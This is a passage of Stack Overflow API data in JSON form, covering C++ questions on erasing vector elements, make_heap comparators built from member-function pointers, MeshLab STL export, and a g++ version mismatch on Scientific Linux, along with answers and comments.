true;\n}\n</code></pre>\n\n<p>then in the main loop:</p>\n\n<pre><code>void Game::Update()\n{\n   size_t size = PlayerUnits.size();\n\n   //iterate backwards, so there is no skipping\n   for(int i = size-1; i&gt;= 0; i--)\n   {\n       PlayerUnits[i]-&gt;Update();\n       if(PlayerUnits[i]-&gt;isDead()) PlayerUnits.erase(PlayerUnits.begin() + i);\n   }\n}\n</code></pre>\n\n<p>This is at least how I personally do it. </p>\n"}], "owner": {"reputation": 41, "user_id": 4760483, "user_type": "registered", "accept_rate": 25, "profile_image": "https://lh5.googleusercontent.com/-0JC1QUyDOQU/AAAAAAAAAAI/AAAAAAAAALE/Jbr1vMuko8Y/photo.jpg?sz=128", "display_name": "TRV", "link": "https://stackoverflow.com/users/4760483/trv"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1263, "favorite_count": 0, "accepted_answer_id": 29806010, "answer_count": 3, "score": 2, "last_activity_date": 1429731820, "creation_date": 1429727078, "last_edit_date": 1429727948, "question_id": 29805925, "link": "https://stackoverflow.com/questions/29805925/removing-multiple-elements-from-a-vector-c", "title": "Removing multiple elements from a vector c++", "body": "<p>Here is some code which checks if 2 units are killed after they attack each other, I pass in the position in the vector however when I remove one the vector is changed in size and therefore the 2nd unit is out of range. How can I remove both simultaneously? </p>\n\n<pre><code>if ((MyHealth &lt;= 0) &amp;&amp; (EnemyHealth &lt;= 0))\n{\n    PlayerUnits.erase(PlayerUnits.begin() + MyUnit, PlayerUnits.begin() + EnemyUnit);\n}\nelse if (MyHealth &lt;= 0)\n{\n    PlayerUnits.erase(PlayerUnits.begin() + MyUnit);\n}\nelse if (EnemyHealth &lt;= 0)\n{\n    PlayerUnits.erase(PlayerUnits.begin() + EnemyUnit);\n}\n</code></pre>\n"}, {"tags": ["c++", "stl", "heap", "function-pointers", "member-function-pointers"], "comments": [{"owner": {"reputation": 1787, "user_id": 916549, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/yezKv.jpg?s=128&g=1", "display_name": "Sarang", "link": "https://stackoverflow.com/users/916549/sarang"}, "edited": false, "score": 0, "creation_date": 1429727366, "post_id": 29805915, "comment_id": 47739899, "body": "how is this being called? you should be appending &amp; before function being passed to your algo"}, {"owner": {"reputation": 55, "user_id": 4734095, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/e143342f463ada207beccdd3e6870d21?s=128&d=identicon&r=PG&f=1", "display_name": "Pedro Pereira", "link": "https://stackoverflow.com/users/4734095/pedro-pereira"}, "reply_to_user": {"reputation": 1787, "user_id": 916549, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/yezKv.jpg?s=128&g=1", "display_name": "Sarang", "link": "https://stackoverflow.com/users/916549/sarang"}, "edited": false, "score": 0, "creation_date": 1429727523, "post_id": 29805915, "comment_id": 47739990, "body": "Already edited. Thanks for the time"}], "answers": [{"tags": [], "owner": {"reputation": 245138, "user_id": 2069064, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/e4V2X.jpg?s=128&g=1", "display_name": "Barry", "link": "https://stackoverflow.com/users/2069064/barry"}, "is_accepted": false, "score": 2, "last_activity_date": 1429728974, "last_edit_date": 1429728974, "creation_date": 1429728528, "answer_id": 29806387, "question_id": 29805915, "link": "https://stackoverflow.com/questions/29805915/passing-a-function-pointer-as-a-comparator-in-a-stl-make-heap-c/29806387#29806387", "title": "Passing a function_pointer as a comparator in a stl make_heap c++", "body": "<p>You're passing the wrong type. <a href=\"http://en.cppreference.com/w/cpp/algorithm/make_heap\" rel=\"nofollow\"><code>std::make_heap</code></a> takes a functor as the third element, which should satisfy the requirements of <a href=\"http://en.cppreference.com/w/cpp/concept/Compare\" rel=\"nofollow\"><code>Compare</code></a>, which are that you need:</p>\n\n<pre><code>bool operator()(const Type1&amp;, const Type2&amp;) const;\n</code></pre>\n\n<p>You are passing in <code>pq_order</code> which is of type:</p>\n\n<pre><code>bool(Graph::*)(const Vertex* &amp;, const Vertex* &amp;)\n</code></pre>\n\n<p>That's a pointer-to-member, it's not callable without an object of type <code>Graph</code>. Hence the error about \"Type must use '.<em>' or '-></em>' to call pointer-to-member\". The simplest approach is to simply provide that object, which in your case is <code>this</code>:</p>\n\n<pre><code>using namespace std::placeholders;\nstd::make_heap(pq.begin(), pq.end(), \n    std::bind(pq_order, this, _1, _2));\n</code></pre>\n\n<p>Alternatively, since <code>regular_PqOrder</code> doesn't actually rely on any of the members of other methods of <code>Graph</code>, you could also just be to make it static:</p>\n\n<pre><code>class Graph { \npublic:\n    static bool regular_PqOrder(const Vertex* &amp;v, const Vertex* &amp;u) \n    {\n        return v-&gt;holder &gt; u-&gt;holder;\n    }\n};\n</code></pre>\n\n<p>And pass in <code>Graph::regular_PqOrder</code> now as a function pointer, rather than pointer-to-method. </p>\n"}, {"tags": [], "owner": {"reputation": 1787, "user_id": 916549, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/yezKv.jpg?s=128&g=1", "display_name": "Sarang", "link": "https://stackoverflow.com/users/916549/sarang"}, "is_accepted": true, "score": 1, "last_activity_date": 1429729098, "creation_date": 1429729098, "answer_id": 29806555, "question_id": 29805915, "link": "https://stackoverflow.com/questions/29805915/passing-a-function-pointer-as-a-comparator-in-a-stl-make-heap-c/29806555#29806555", "title": "Passing a function_pointer as a comparator in a stl make_heap c++", "body": "<p>I have simplified your problem to:</p>\n\n<pre><code>#include &lt;algorithm&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nclass Vertex\n{};\n\nclass Graph\n{\npublic:\n    void dijkstraAlg(Vertex* ini, Vertex* fin, void(Graph::*weight_filler)(void), \n                                               bool(Graph::*pq_order)(const Vertex*, const Vertex*))\n    {\n        (this-&gt;*weight_filler)();\n\n        struct Comparator\n        {\n        private:\n\n            Graph* m_g;\n            bool(Graph::*m_fn)(const Vertex*, const Vertex*);\n        public:\n            Comparator(Graph* g, bool(Graph::*fn)(const Vertex*, const Vertex*)) : m_g(g), m_fn(fn)\n            {}\n\n            bool operator()(const Vertex* one, const Vertex* two) const\n            {\n                return (m_g-&gt;*m_fn)(one, two);\n            }\n        };\n\n        Comparator comparator(this, pq_order);\n\n        vector&lt;Vertex*&gt; pq;\n        std::make_heap(pq.begin(), pq.end(), comparator);\n    }\n\n    void weight_filler1()\n    {        \n    }\n    bool pq_order1(const Vertex*, const Vertex*)\n    {\n        return false;\n    }\n\n};\n\nint main()\n{\n    Graph g;\n    g.dijkstraAlg(nullptr, nullptr, &amp;Graph::weight_filler1, &amp;Graph::pq_order1);\n\n    return 0;\n}\n</code></pre>\n\n<p>The problem is: <code>std::make_heap</code> expects a function pointer- in your case you are passing a pointer to member function thus the issue.</p>\n\n<p>Either you can change the declaration of <code>dijkstraAlg</code> to take in just a static function pointer <code>pq_order</code> or wrap up <code>pq_order</code> in a structure to make it a callable entity in itself like I have done.</p>\n\n<p>Note: you will have to fixup references to pointers in <code>pq_order</code> for <code>make_heap</code> to compile anyway</p>\n"}], "owner": {"reputation": 55, "user_id": 4734095, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/e143342f463ada207beccdd3e6870d21?s=128&d=identicon&r=PG&f=1", "display_name": "Pedro Pereira", "link": "https://stackoverflow.com/users/4734095/pedro-pereira"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 322, "favorite_count": 0, "accepted_answer_id": 29806555, "answer_count": 2, "score": 0, "last_activity_date": 1429729098, "creation_date": 1429727026, "last_edit_date": 1429727503, "question_id": 29805915, "link": "https://stackoverflow.com/questions/29805915/passing-a-function-pointer-as-a-comparator-in-a-stl-make-heap-c", "title": "Passing a function_pointer as a comparator in a stl make_heap c++", "body": "<p>I'm developing this program to run Dijkstra's Algorithm with an heap implementation and I want it to be as versatile as it can be so I'm using function pointer in order to avoid code repetition. This is the error that it pops. I'm using the stl make_heap</p>\n\n<pre><code>\"Type must use '.*' or '-&gt;*' to call pointer-to-member function in '__comp (...)', e.g. '(... -&gt;* __comp) (...)' \"heap.h     C/C++ Problem\n</code></pre>\n\n<p>Here is Dijkstra's Algorithm:</p>\n\n<pre><code>void Graph::dijkstraAlg(Vertex* ini, Vertex* fin, void(Graph::*weight_filler)(void), bool(Graph::*pq_order)(const Vertex* &amp;, const Vertex* &amp;)){\n\nfor(unsigned int i = 0; i &lt; vertexs.size(); i++) {\n    vertexs[i]-&gt;path = NULL;\n    vertexs[i]-&gt;holder = MAX_INT_VALUE;\n    vertexs[i]-&gt;processing=false;\n}\n\n(this-&gt;*weight_filler)();\n\nVertex* v=ini;\nv-&gt;holder = 0;\nv-&gt;processing = true;\n\nvector&lt;Vertex*&gt; pq;\npq.push_back(v);\nmake_heap(pq.begin(),pq.end(),pq_order);\n\nwhile(!pq.empty()){\n\n    v=pq.front();\n    pop_heap(pq.begin(),pq.end());\n    pq.pop_back();\n\n    for(unsigned int u=0; u &lt; v-&gt;adj.size(); u++){\n\n        Vertex* w = v-&gt;adj[u]-&gt;dest;\n\n        if((v-&gt;holder+v-&gt;adj[u]-&gt;weight) &lt; w-&gt;holder){\n\n            w-&gt;holder=v-&gt;holder + v-&gt;adj[u]-&gt;weight;\n            w-&gt;path=v;\n\n            if(!w-&gt;processing){\n\n                w-&gt;processing=true;\n                pq.push_back(w);\n            }\n        }\n\n        make_heap(pq.begin(),pq.end(),pq_order);\n    }\n}\n\nreturn;}\n</code></pre>\n\n<p>The error is in the make_heap and I can't figure it out, any help is appreciated.</p>\n\n<p>Here is the function I'm passing to the make_heap:</p>\n\n<pre><code>bool Graph::regular_PqOrder(const Vertex* &amp;v, const Vertex* &amp;u){\nreturn v-&gt;holder &gt; u-&gt;holder;}\n</code></pre>\n\n<p>This is how I call the algo:</p>\n\n<pre><code>dijkstraAlg(i,f,&amp;Graph::price_WeightFiller,&amp;Graph::regular_PqOrder);\n</code></pre>\n\n<p>If you need more information just tell me and I edit it.\nThank you pal's</p>\n"}, {"tags": ["c++", "stl", "cad", "meshlab"], "answers": [{"tags": [], "owner": {"reputation": 105, "user_id": 1803440, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e1c6537f9f09241b59f8c509996d87dc?s=128&d=identicon&r=PG", "display_name": "Javier Chauvin", "link": "https://stackoverflow.com/users/1803440/javier-chauvin"}, "is_accepted": false, "score": 2, "last_activity_date": 1429879861, "creation_date": 1429879861, "answer_id": 29848006, "question_id": 29805856, "link": "https://stackoverflow.com/questions/29805856/exported-to-stl-on-meshlab-is-no-longer-a-text-file/29848006#29848006", "title": "exported to STL on MeshLab is no longer a text file", "body": "<p>Just uncheck the \"Binary encoding\" box inside the export mesh window.</p>\n"}], "owner": {"reputation": 105, "user_id": 1803440, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e1c6537f9f09241b59f8c509996d87dc?s=128&d=identicon&r=PG", "display_name": "Javier Chauvin", "link": "https://stackoverflow.com/users/1803440/javier-chauvin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 315, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1429881813, "creation_date": 1429726816, "last_edit_date": 1429881813, "question_id": 29805856, "link": "https://stackoverflow.com/questions/29805856/exported-to-stl-on-meshlab-is-no-longer-a-text-file", "title": "exported to STL on MeshLab is no longer a text file", "body": "<p>I have an <code>.stl</code> file produced by a scanner with a lot of triangles. I want to use that data to create a hole repair algorithm.  To prepare the data, I want to reduce the amount of vertices.  First, I use the MeshLab \"Quadratic decimation\" reduction filter. After that, I try to export the mesh as <code>.stl</code> but the new file is no longer recognized as a text file. When I open it with notepad++ to check the vertices, I only see strange symbols - but the new file is still recognized by MeshLab.</p>\n\n<p>Is there a way to save the <code>.stl</code> file in order to read it as a text file too? If not, how can the non-text format be read from a C++ program?</p>\n"}, {"tags": ["c++", "c++11"], "comments": [{"owner": {"reputation": 13028, "user_id": 1401351, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/993d07ca1cd59dd11d96a896e7c804d0?s=128&d=identicon&r=PG", "display_name": "Peter", "link": "https://stackoverflow.com/users/1401351/peter"}, "edited": false, "score": 0, "creation_date": 1429727528, "post_id": 29805852, "comment_id": 47739995, "body": "devtoolset layers on top of your system rather than replacing the compiler, so be sure you&#39;re doing something like this to activate it: <code>scl enable devtoolset-2 &#39;bash&#39;</code>.  Also, be sure you don&#39;t have any object files or static libraries lying around from a previous compile"}, {"owner": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "reply_to_user": {"reputation": 13028, "user_id": 1401351, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/993d07ca1cd59dd11d96a896e7c804d0?s=128&d=identicon&r=PG", "display_name": "Peter", "link": "https://stackoverflow.com/users/1401351/peter"}, "edited": false, "score": 0, "creation_date": 1429727664, "post_id": 29805852, "comment_id": 47740067, "body": "@Peter Thanks for your comment. I ran scl enable devtoolset-2 &#39;bash&#39; but still I am getting the same error. How do I find out object files or static libraries from previous compile?"}], "answers": [{"comments": [{"owner": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429727189, "post_id": 29805910, "comment_id": 47739800, "body": "How do I find path to new library?"}, {"owner": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "reply_to_user": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429727269, "post_id": 29805910, "comment_id": 47739843, "body": "@StegVerner: See <code>&#47;use&#47;local&#47;lib</code> or <code>usr&#47;local&#47;lib64</code>.  Just <code>locate libstdc++</code>."}, {"owner": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429727404, "post_id": 29805910, "comment_id": 47739927, "body": "I have edited to my question output of locate libstdc++. I dont know which one is new one now"}, {"owner": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "reply_to_user": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429727629, "post_id": 29805910, "comment_id": 47740050, "body": "Post the output of <code>which g++</code>  and <code>g++ --version</code>. Also, compile your code with <code>-V</code> option and post the messages."}, {"owner": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429727737, "post_id": 29805910, "comment_id": 47740114, "body": "which g++ gives: /usr/bin/g++. g++ --version gives: g++ (GCC) 4.4.7 20120313 (Red Hat 4.4.7-11)"}, {"owner": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "reply_to_user": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429727784, "post_id": 29805910, "comment_id": 47740145, "body": "Ahh... which means your using older version of g++.. and it tries to use new version of <code>libstdc++</code>."}, {"owner": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429727828, "post_id": 29805910, "comment_id": 47740164, "body": "ok..can you please guide me as to how can I install g++ on Scientific Linux 6"}, {"owner": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "reply_to_user": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429727964, "post_id": 29805910, "comment_id": 47740246, "body": "Try <code>locate g++</code>... and see how many of them are there on your system."}, {"owner": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429728050, "post_id": 29805910, "comment_id": 47740291, "body": "I have added locate g++ output to question as it was long"}, {"owner": {"reputation": 13028, "user_id": 1401351, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/993d07ca1cd59dd11d96a896e7c804d0?s=128&d=identicon&r=PG", "display_name": "Peter", "link": "https://stackoverflow.com/users/1401351/peter"}, "edited": false, "score": 0, "creation_date": 1429728074, "post_id": 29805910, "comment_id": 47740303, "body": "Don&#39;t forget that <code>locate</code> works off a database which refreshes by default once per day."}, {"owner": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "edited": false, "score": 0, "creation_date": 1429728144, "post_id": 29805910, "comment_id": 47740351, "body": "Also post the output of <code>&#47;usr&#47;bin&#47;g++ --version</code> and <code>&#47;usr&#47;bin&#47;x86_64-redhat-linux-g++ --version</code>. :D"}, {"owner": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429728219, "post_id": 29805910, "comment_id": 47740390, "body": "/usr/bin/g++ --version gives g++ (GCC) 4.4.7 20120313 (Red Hat 4.4.7-11) and /usr/bin/x86_64-redhat-linux-g++ gives x86_64-redhat-linux-g++: no input files"}, {"owner": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "reply_to_user": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429728324, "post_id": 29805910, "comment_id": 47740464, "body": "@StegVerner: please use <code>--version</code> with the second command. I&#39;m asking you to post the versions of each <code>g++</code>. So you need to understand few things <b>yourself</b>; otherwise it&#39;d be really difficult to help you."}, {"owner": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429728389, "post_id": 29805910, "comment_id": 47740513, "body": "Sorry my bad.  /usr/bin/x86_64-redhat-linux-g++ --version gives x86_64-redhat-linux-g++ (GCC) 4.4.7 20120313 (Red Hat 4.4.7-11)"}, {"owner": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "reply_to_user": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429728506, "post_id": 29805910, "comment_id": 47740585, "body": "@StegVerner: That means you don&#39;t have <code>g++ 4.8</code> installed on your system. Or your <code>locate</code> couldn&#39;t find it, maybe you need to <code>updatedb</code> (as <code>root</code> user) as well before <code>locate g++</code>."}, {"owner": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429728778, "post_id": 29805910, "comment_id": 47740767, "body": "I have updated the output of locate g++ after running updatedb in my question"}, {"owner": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "edited": false, "score": 0, "creation_date": 1429728919, "post_id": 29805910, "comment_id": 47740851, "body": "As usual, I&#39;d like to know the version of each <code>g++</code> . So please post them as well <i>(post the exactly command as well, with each output)</i>. Do these things yourself before I ask you. It is getting difficult that I&#39;m asking the similar questions again and again."}, {"owner": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429728986, "post_id": 29805910, "comment_id": 47740893, "body": "Very sorry. The version of /opt/rh/devtoolset-2/root/usr/bin/g++ --version is the correct one: g++ (GCC) 4.8.2 20140120 (Red Hat 4.8.2-15)"}, {"owner": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429729185, "post_id": 29805910, "comment_id": 47741015, "body": "After this I did rm /usr/bin/g++ and ln -s /opt/rh/devtoolset-2/root/usr/bin/g++ /usr/bin/g++. Now my g++ version gives: g++ --version g++ (GCC) 4.8.2 20140120 (Red Hat 4.8.2-15). But still I am getting the same error with netbeans"}, {"owner": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "reply_to_user": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429729222, "post_id": 29805910, "comment_id": 47741037, "body": "@StegVerner: Great. Use <code>&#47;opt&#47;rh&#47;devtoolset-2&#47;root&#47;usr&#47;bin&#47;g++</code> to compile your code and link against the compatible <code>libstdc++</code>. Maybe you&#39;d like to <b>prepend</b> (not <i>append</i>)  <code>PATH</code> and <code>LD_LIBRARY_PATH</code> with the <code>[..]&#47;bin</code> and <code>[...]&#47;lib</code> respectively, in your <code>.bashrc</code>  if you dont want to write <code>&#47;opt&#47;rh&#47;devtoolset-2&#47;root&#47;usr&#47;bin&#47;g++</code> everytime on the terminal."}, {"owner": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429729456, "post_id": 29805910, "comment_id": 47741197, "body": "I did the following: export PATH=&quot;$TDBROOT/opt/rh/devtoolset-2/root/usr/bin:$PATH&quot; export CLASSPATH=&quot;.:$JENAROOT/opt/rh/devtoolset-2/root/usr/bin/g++/&zwnj;&#8203;lib/*.jar&quot; and restarted netbeans but still I am getting the same error with netbeans"}, {"owner": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "reply_to_user": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429729622, "post_id": 29805910, "comment_id": 47741314, "body": "@StegVerner: I don&#39;t think <code>CLASSPATH</code> has anything to do with it. Maybe it is Java thingy? (I&#39;m not sure)."}, {"owner": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429729708, "post_id": 29805910, "comment_id": 47741381, "body": "I restored CLASSPATH=&quot;.:$JENAROOT/g++/lib/*.jar&quot;  but still I am getting the same error I dont know why"}, {"owner": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "reply_to_user": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429729822, "post_id": 29805910, "comment_id": 47741454, "body": "@StegVerner: As I said the value of <code>CLASSPATH</code> has nothing to do with it. It is most like a Java thingy. You should leave it in peace when you&#39;re working with <code>g++</code> (and C++ language)."}, {"owner": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429730215, "post_id": 29805910, "comment_id": 47741688, "body": "Hmmm...very true :)..my gcc --version and g++ --version are both 4.8.2, then I dont know why am I getting this error"}, {"owner": {"reputation": 853, "user_id": 4360034, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f288ec78f7cde374ca038375bc32cc21?s=128&d=identicon&r=PG&f=1", "display_name": "Steg Verner", "link": "https://stackoverflow.com/users/4360034/steg-verner"}, "edited": false, "score": 0, "creation_date": 1429730295, "post_id": 29805910, "comment_id": 47741736, "body": "Thanks a lot..it worked..i restarted netbeans once more and it started working...thanks a lot again."}], "tags": [], "owner": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "is_accepted": true, "score": 1, "last_activity_date": 1429727914, "last_edit_date": 1429727914, "creation_date": 1429727016, "answer_id": 29805910, "question_id": 29805852, "link": "https://stackoverflow.com/questions/29805852/running-c11-programs/29805910#29805910", "title": "Running C++11 